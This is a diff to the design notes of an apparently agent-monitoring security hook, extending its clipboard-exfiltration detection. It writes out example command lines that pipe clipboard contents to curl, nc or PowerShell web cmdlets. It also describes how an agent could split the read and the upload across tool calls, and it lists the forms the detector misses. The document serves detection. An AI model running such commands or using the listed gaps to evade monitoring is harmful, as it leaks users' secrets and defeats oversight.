@@ -256,7 +256,15 @@ Two detectors, both `prompt` stage like #43 (the Bash hook scans the command tex
   scripts, and #39 is `notify` with no org policy, so this reports and never halts.
 - `clipboard-to-sink` (#1, sensitive data leak) is built from the same list and fires when the read feeds
   an outbound sink in the same command: a pipe chain ending in `curl`/`wget`/`nc`/`ncat`/`socat` or the
-  PowerShell web cmdlets, or a URL / network client in the same segment (`curl -d "$(pbpaste)" …`). It is a
+  PowerShell web cmdlets, or a URL / network client in the same segment (`curl -d "$(pbpaste)" …`). It
+  also fires across statements of one command string (`;`, `&&`, `||`, newline) when the sink statement
+  names what the read filled. That can be a shell variable (`x=$(pbpaste); curl -d "$x" …`), a
+  PowerShell variable (`$b = Get-Clipboard; irm … -Body $b`), or a file the read was redirected, teed
+  or `Out-File`'d into (`pbpaste > /tmp/k; curl --data-binary @/tmp/k …`, `nc host 443 < k.txt`,
+  `-InFile clip.txt`). A later network call that does not name the variable or file stays silent:
+  `x=$(pbpaste); echo "$x" | wc -c; curl -s https://api.github.com/zen` reports only the #39 read. So
+  does a file named as a download target (`-o`, `-O`, `--output`, `-OutFile`, `>`) or inside a URL path.
+  It is a
   separate threat so it shows as its own finding next to #39 instead of merging into it. It is not #65:
   #65 blocks by default and is for confirmed secret values, and clipboard-to-pastebin is a real developer
   habit. It is also `notify` by default. An org that wants it to halt sets `threatPolicy[1]`, and that
@@ -265,6 +273,23 @@ Two detectors, both `prompt` stage like #43 (the Bash hook scans the command tex
 Both sit ahead of every other #39 / #1 detector, because findings are deduped per threat and the last
 `warn` wins. A real secret or card number in the same text therefore keeps the slot.
 `test/clipboard-read.test.mjs` covers this.
+
+**Across tool calls.** An agent that runs `pbpaste` in one call has the clipboard in its context, and it
+can type the value into `curl -d '…'` in the next call. No variable or file connects the two, so no
+pattern on one command string can see it. For each Bash call the hook records two content-free booleans
+on its agent event (`cli/hook-core.mjs` `clipboardSignals`): `clip`, meaning the command reads the
+clipboard, and `upload`, meaning it sends a payload off the device. An upload is `curl` with
+`-d`/`--data*`/`-F`/`-T`/`--json`/`-X POST|PUT|PATCH`, `wget --post-*`/`--body-*`, `nc`/`ncat`/`socat`
+other than `-l`/`-z`, or `Invoke-WebRequest`/`Invoke-RestMethod` with `-Body`/`-InFile`/`-Method Post`.
+An upload whose every target is loopback does not count. When a session first has a `clip` event followed
+by a later `upload` event, `logBehavior` posts one content-free alert: #1, category "Clipboard read then
+outbound upload", stage `behavior`, risk High. This uses the same record, before/after and
+post-on-transition path as the lethal-trifecta alert. It does not reuse a trifecta leg. The `read` leg is
+already true for every Bash call, so a clipboard read would add nothing to it, and the trifecta also needs
+the `ingest` leg (untrusted content), which a clipboard-to-upload sequence does not have. Like the
+trifecta post, this alert never changes the allow/deny decision, and `threatPolicy[1]` does not make it
+block. It fires once per session. `test/clipboard-session.test.mjs` covers the signals, the rule, and the
+hook end to end.
 
 ## 4. The three additive passes
 
@@ -624,9 +649,17 @@ Stated rather than papered over.
   `xargs rm`, flags after `--`, PowerShell splatting or variable parameters, GNU `--interactive=never` as
   a force equivalent. `-Recurse:$false` still fires. No benign or attack corpus exercises these forms, so
   their recall and false-positive rate rest on the synthetic tests in `test/detector-coverage-tier1.test.mjs`.
-- **Clipboard detection is per command segment and shell-only.** A read and a sink in separate statements
-  (`x=$(pbpaste); curl -d "$x" …`, or through a temp file) raise only the #39 read, not the #1 sink.
-  Reads from inside a language runtime (`pyperclip.paste()`, `clipboardy`, `xdotool`, `tmux
+- **Clipboard detection is shell-only, and the cross-call rule is not tied to the clipboard value.**
+  Within one command string, the sink must name the variable or file within 400 characters of the read,
+  and only the first redirect after a read is followed. Variable names match case-insensitively, so
+  `x=$(pbpaste); curl -d "$X" …` fires. `cat k > k2; curl -d @k2 …` (a copy) and a sink written as a
+  here-doc do not. Across calls, the rule knows only that the session read the clipboard earlier and is now
+  uploading something. It cannot tell whether the upload carries the clipboard value, so an unrelated
+  `curl -d '{"q":1}' https://api.example.com` after any `pbpaste` in the session raises it. A `curl -d`
+  inside quoted prose (`git commit -m "use curl -d …"`) counts as an upload too. WebFetch, MCP tools,
+  `scp`/`rsync`/`git push` and GET requests that carry data in the query string are not uploads. The
+  session key is the hashed session id, so on an unenrolled device, where every hash is the same
+  sentinel, all sessions share one key. Reads from inside a language runtime (`pyperclip.paste()`, `clipboardy`, `xdotool`, `tmux
   show-buffer`, Cygwin `/dev/clipboard`, `termux-clipboard-get`) are not covered. The patterns were
   written with their tests. No benign or attack corpus contains a clipboard command, so their precision
   on real agent traffic has not been measured. Because `file` inherits `prompt`, a shell script that
